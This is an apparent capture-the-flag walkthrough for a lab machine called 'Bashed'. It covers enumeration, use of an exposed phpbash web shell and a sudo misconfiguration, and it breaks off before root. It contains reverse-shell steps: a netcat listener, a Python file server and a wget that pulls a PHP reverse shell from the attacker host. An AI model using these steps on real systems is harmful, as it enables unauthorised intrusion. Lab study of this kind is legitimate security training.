nmap only shows port 80
gobuster shows lots of things!

/dev/ directory has a phpbash.php shell!
We can navigate to /home/arrexel and get user!

www-data@bashed
:/home/arrexel# cat user.txt
REDACTED FOR WALKTHROUGH

Now let's try to elevate privs and get root!

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL

It looks like we can run scriptmanager as root

/var/www/html/uploads is world-writable

We can upload a php script to /uploads and run it!
Pentestmonkey has created a script that is included in kali :)
Reference:
http://pentestmonkey.net/tools/php-reverse-shell

kali: cp /usr/share/webshells/php/php-reverse-shell.php myShell.php
Edit myShell.php to include kali's IP and say, port 4000

Set up a webserver on kali to serve the file to victim.
kali: sudo python -m SimpleHTTPServer 80

Set up a netcat listener on kali with same port # in myShell.php
nc -lvnp 4000

vic: browse to the world-writable directory /var/www/html/uploads
Upload the script from kali to vic
wget 10.10.14.15/myShell.php
Saving to: 'myShell.php'

It's a dumb shell, but we can switch user 'scriptmanager'
